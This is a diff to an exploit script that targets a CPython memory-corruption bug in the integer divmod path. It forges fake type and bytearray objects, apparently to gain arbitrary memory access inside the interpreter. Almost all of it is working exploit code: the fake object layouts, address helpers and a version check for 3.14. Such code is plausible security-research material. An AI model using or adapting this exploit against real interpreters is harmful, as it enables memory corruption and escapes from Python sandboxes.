@@ -50,6 +50,12 @@ pylong_int_divmod(PyLongObject *v, PyLongObject *w,
 }
 """
 
+from common import evil_bytearray_obj, addrof_bytes, PYVER
+
+# TODO: write exploit for versions >=3.14, raise an error until then
+if PYVER >= (3, 14, 0):
+    raise NotImplementedError("Changes were made to the tuple struct that makes this exploit not work on versions >=3.14")
+
 # So the goal here is to return a tuple of 1 item (can't do 0 because that'll just use the cached 0-tuple) where
 # the data following it contains a pointer to an object we can control. We can pull this off by using bytearrays since their
 # buffers are allocated independently of the object itself, so our fake data can come after the tuple data. To bypass the
@@ -76,23 +82,19 @@ to_modify = bas[-1]
 p64 = lambda num: num.to_bytes(8, 'little')
 TP_FLAGS_OFFSET = 0xA8
 
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
+
 # this one's a bit crazy because it'll be our fake bytearray object but also act as an int subclass type
-fake_type = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-).ljust(TP_FLAGS_OFFSET, b"\0") + p64(1 << 24)
+fake_type = fake_obj.ljust(TP_FLAGS_OFFSET, b"\0") + p64(1 << 24)
 
 fake_obj = (
     p64(0x1111) + # ob_refcnt
-    p64(id(fake_type) + bytes.__basicsize__ - 1) # ob_type
+    p64(addrof_bytes(fake_type)) # ob_type
 )
 
 # this data *should* be the data following the tuple content in `to_return`
-to_modify[:8] = p64(id(fake_obj) + bytes.__basicsize__ - 1)
+to_modify[:8] = p64(addrof_bytes(fake_obj))
 
 # to get divmod to use _pylong.int_divmod, we need to divide
 # two obnoxiously large numbers. These two work to do that.
@@ -122,6 +124,10 @@ _, y = divmod(a, b)
 # into thinking it was an int subclass with the actual evil bytearray being stored at the start,
 # so now we can retrieve our evil bytearray object by just getting the type of `y`
 mem = type(y)
+
+# sometimes may fail
+if type(mem) is not bytearray:
+    exit("failed")
 
 print(type(mem))
 print(hex(len(mem)))
